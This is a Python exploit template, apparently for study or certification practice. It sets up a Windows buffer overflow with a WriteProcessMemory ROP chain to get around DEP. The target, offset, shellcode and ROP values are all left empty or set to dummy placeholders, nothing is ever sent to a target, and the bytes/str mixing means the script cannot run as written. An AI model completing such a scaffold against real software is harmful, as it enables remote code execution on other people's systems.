#!/usr/bin/python
import socket
from struct import pack
import sys
# badchar: 
# badchar: 
# code cave:  
# lpnumberofbyte:
# offset: 

try:
    target_ip = ""
    target_port = 0
    buffersize = 0
    offset = 0

    shellcode = b""
    print(len(shellcode))

    wpm = pack("<L", 0x69696969) # dummy WriteProcessMemory Address
    wpm += pack("<L", 0x6A6A6A6A) # Return Address after WriteProcessMemory
    wpm += pack("<L", 0x6B6B6B6B) # dummy hProcess
    wpm += pack("<L", 0x6C6C6C6C) # dummy lpBaseAddress
    wpm += pack("<L", 0x6D6D6D6D) # dummy lpBuffer
    wpm += pack("<L", 0x6E6E6E6E) # dummy nSize
    wpm += pack("<L", 0x6F6F6F6F) # dummy lpNumberOfBytesWritten

    junk = b"A"* (offset-len(wpm))

    eip = ""
    rop = ""

    print("[+] Saving ESP Address ...")
    print("[+] Patching lBuffer ...")
    print("[+] Patching nSize ...")
    print("[+] Patching WPM ...")
    print("[+] Returning to WPM ...")

    inputBuffer = junk + wpm + eip + rop + shellcode
except Exception as e:
    print("[!] something went wrong!")
    print(e)